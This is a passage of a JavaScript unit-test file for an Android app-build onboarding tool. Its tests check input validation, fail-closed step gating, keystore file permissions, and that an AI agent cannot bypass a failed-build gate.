  const r = await runAdvance(deps, { checkBuild: true, platform: 'android' })
  eq(r.state, 'build-stale-record', `expected build-stale-record, got ${r.state}`)
  eq(r.kind, 'error')
})

await test('hostile: androidPackage "__manual__" is navigation-only — manual prompt renders, sentinel never persists', async () => {
  const deps = androidBridgeDeps()
  const p = buildReadyProgress()
  p._oauthRefreshToken = 'rt123' // resume routing needs a usable sign-in, like the bridge tests above
  delete p.completedSteps.androidPackageChosen
  delete p.completedSteps.serviceAccountProvisioned
  delete p.completedSteps.playInviteProvisioned
  deps._setAndroidProgress(p) // resume = android-package-select
  const r = await runAdvance(deps, { androidPackage: '__manual__' })
  eq(r.state, 'android-package-select', `expected android-package-select, got ${r.state}`)
  eq(r.kind, 'human_gate', `the manual prompt must be a human_gate (text input), got ${r.kind}`)
  const after = deps._getAndroidProgress()
  ok(!after?.completedSteps?.androidPackageChosen, 'the __manual__ sentinel must never be persisted as a package name')
})

await test('hostile: invalid playDeveloperId surfaces the TUI corrective and persists nothing', async () => {
  const deps = androidBridgeDeps()
  const p = buildReadyProgress()
  p._oauthRefreshToken = 'rt123' // resume routing needs a usable sign-in, like the bridge tests above
  delete p.completedSteps.playAccountChosen
  delete p.completedSteps.gcpProjectChosen
  delete p.completedSteps.androidPackageChosen
  delete p.completedSteps.serviceAccountProvisioned
  delete p.completedSteps.playInviteProvisioned
  deps._setAndroidProgress(p) // resume = play-developer-id-input
  const r = await runAdvance(deps, { playDeveloperId: 'definitely-not-a-developer-id' })
  eq(r.state, 'play-developer-id-input', `expected play-developer-id-input, got ${r.state}`)
  ok(
    r.summary.includes('Could not extract a developer ID'),
    `summary must carry the TUI corrective wording, got: ${String(r.summary).slice(0, 140)}`,
  )
  ok(!deps._getAndroidProgress()?.completedSteps?.playAccountChosen, 'an invalid id must not persist a playAccountChosen')
})

// Helper: progress parked at google-sign-in (keystore done, generate method chosen,
// sign-in not complete).
function signInParkedProgress() {
  const p = buildReadyProgress()
  delete p.completedSteps.googleSignInComplete
  delete p.completedSteps.playAccountChosen
  delete p.completedSteps.gcpProjectChosen
  delete p.completedSteps.androidPackageChosen
  delete p.completedSteps.serviceAccountProvisioned
  delete p.completedSteps.playInviteProvisioned
  return p
}

await test('hostile: OAuth begin() failure returns a structured retry gate (no raw throw out of the tool)', async () => {
  const deps = androidBridgeDeps({
    oauthSession: {
      begin: async () => { throw new Error('loopback port busy') },
      poll: () => ({ status: 'absent' }),
      clear: () => {},
    },
  })
  deps._setAndroidProgress(signInParkedProgress())
  const r = await runAdvance(deps, {}) // plain continue at google-sign-in = proceed
  eq(r.state, 'google-sign-in', `expected google-sign-in, got ${r.state}`)
  eq(r.kind, 'human_gate', `expected a structured human_gate, got ${r.kind}`)
  ok(/loopback port busy/.test(r.summary), `summary must surface the begin() failure reason, got: ${String(r.summary).slice(0, 140)}`)
})

await test('hostile: fetchUserInfo failure after sign-in is NON-FATAL — completes with a blank email (the broker deleted the session)', async () => {
  // The broker hard-deletes the session on the 'done' handoff, so we can never re-poll. A cosmetic userinfo
  // failure must therefore NOT force a re-sign-in — provisioning uses the access token, not the email.
  let sessionCleared = false
  const deps = androidBridgeDeps({
    oauthSession: {
      begin: async () => ({ signInUrl: 'https://api.capgo.app/builder_auth_direct/google/start?s=X' }),
      poll: () => ({ status: 'done', accessToken: 'at-1', expiresAt: Date.now() + 3600_000 }),
      clear: () => { sessionCleared = true },
    },
  })
  deps.androidEffectDeps.fetchUserInfo = async () => { throw new Error('userinfo endpoint unreachable') }
  deps._setAndroidProgress(signInParkedProgress())
  const r = await runAdvance(deps, {})
  eq(r.state, 'play-developer-id-input', `sign-in must complete and advance, got ${r.state}`)
  const saved = deps._getAndroidProgress()
  ok(saved?.completedSteps?.googleSignInComplete, 'sign-in must be marked complete')
  eq(saved.completedSteps.googleSignInComplete.email, '', 'email is blank when the userinfo fetch failed')
  eq(saved._oauthAccessToken, 'at-1', 'the access token is persisted for provisioning')
  ok(sessionCleared, 'the broker session is cleared after handoff')
})

await test('hostile: android gate fails closed — a keystore field at google-sign-in is rejected and nothing persists', async () => {
  const deps = androidBridgeDeps()
  deps._setAndroidProgress(signInParkedProgress())
  const r = await runAdvance(deps, { keystoreStorePassword: 'sneaky-pw-123' })
  eq(r.state, 'google-sign-in', `the corrective must re-render the current step, got ${r.state}`)
  // decideAndroid may (re)write bookkeeping markers (activePlatform) on the
  // corrective re-render — the INPUT itself must not be applied.
  eq(deps._getAndroidProgress().keystoreStorePassword, 'storePw', 'no input may be applied at an ungoverned step')
  ok(/current step/i.test(r.summary), 'summary must carry a corrective instruction')
})

await test('hostile: validateStepInput unit — governed key at a step with no entry is rejected; bare {} still passes', async () => {
  const { validateStepInput } = await import('../src/build/onboarding/mcp/step-input.ts')
  eq(validateStepInput('google-sign-in', { keystoreStorePassword: 'x' }).ok, false, 'must fail closed for governed keys at ungoverned steps')
  eq(validateStepInput('welcome', { keystoreMethod: 'generate' }).ok, false, 'must fail closed before the android flow has rendered (data-safety gate jump)')
  eq(validateStepInput('google-sign-in', {}).ok, true, 'no governed key → pass (plain continue)')
})

await test('hostile: production buildDeps wires clearBuildRecord (deletes a stale record file)', async () => {
  const { buildDeps } = await import('../src/build/onboarding/mcp/onboarding-tools.ts')
  ok(typeof buildDeps === 'function', 'buildDeps must be exported for production-deps tests')
  const deps = buildDeps({})
  ok(typeof deps.clearBuildRecord === 'function', 'buildDeps must provide clearBuildRecord')
  const p = pathJoin(tmpdir(), `capgo-stale-rec-${Date.now()}.json`)
  await writeFile(p, '{"jobId":"old"}', 'utf-8')
  await deps.clearBuildRecord(p)
  let gone = false
  try {
    await fsReadFile(p)
  }
  catch (e) {
    gone = e.code === 'ENOENT'
  }
  ok(gone, 'clearBuildRecord must remove the file')
})

await test('hostile: writeKeystoreFile writes the .p12 with owner-only permissions (0600)', async () => {
  const { buildDeps } = await import('../src/build/onboarding/mcp/onboarding-tools.ts')
  const { mkdtemp, stat, rm } = await import('node:fs/promises')
  const dir = await mkdtemp(pathJoin(tmpdir(), 'capgo-p12-mode-'))
  const prevCwd = process.cwd()
  process.chdir(dir) // buildDeps captures cwd at construction
  try {
    const deps = buildDeps({})
    const p = await deps.writeKeystoreFile('com.acme.app', Buffer.from('p12-bytes').toString('base64'), 'release')
    const st = await stat(p)
    eq(st.mode & 0o777, 0o600, `expected 0600 on the .p12, got 0${(st.mode & 0o777).toString(8)}`)
  }
  finally {
    process.chdir(prevCwd)
    await rm(dir, { recursive: true, force: true })
  }
})

// ─── Build-fail dead-end gate: a failed build must offer a guarded continuation ───
// The AI must never escape a failed build by calling start_capgo_builder_onboarding
// or capgo_builder_onboarding_next_step. buildFailedResult must carry a `next`
// (no dead end), and ONBOARDING_RULES must forbid the escape tools.
await test('build-failed offers a guarded `next` (no dead end) and rules forbid escaping the build gate', async () => {
  const failedRecord = {
    schemaVersion: 1,
    jobId: 'j-fail',
    appId: 'com.acme.app',
    platform: 'android',
    buildMode: 'release',
    status: 'error',
    outputUrl: null,
    qrCodeAscii: null,
    qrCodePngPath: null,
    finishedAt: new Date().toISOString(),
  }
  const deps = androidBridgeDeps({
    readBuildRecord: async () => failedRecord,
    buildRecordPath: (appId, platform) => `/tmp/capgo-build-record-${appId}-${platform}.json`,
  })
  deps._setAndroidProgress(buildReadyProgress())
  const res = await runAdvance(deps, { checkBuild: true })

  // build-failed must offer a defined continuation (not a dead end) ...
  eq(res.state, 'build-failed', `expected build-failed, got ${res.state}`)
  ok(res.next, 'build-failed must have a next (no dead end)')
  // ... that never escapes the build gate
  ok(res.next.tool !== 'start_capgo_builder_onboarding', 'next.tool must not be start_capgo_builder_onboarding')
  ok(res.next.tool !== 'capgo_builder_onboarding_next_step', 'next.tool must not be capgo_builder_onboarding_next_step')
  // and the rules must forbid escaping a failed build
  ok(
    res.rules.some(r => /failed build/i.test(r) && /start_capgo_builder_onboarding/.test(r)),
    'ONBOARDING_RULES must forbid start_capgo_builder_onboarding after a failed build',
  )
})
console.log(`\n📊 Results: ${pass} passed, ${fail} failed`)
if (fail > 0)
  process.exit(1)
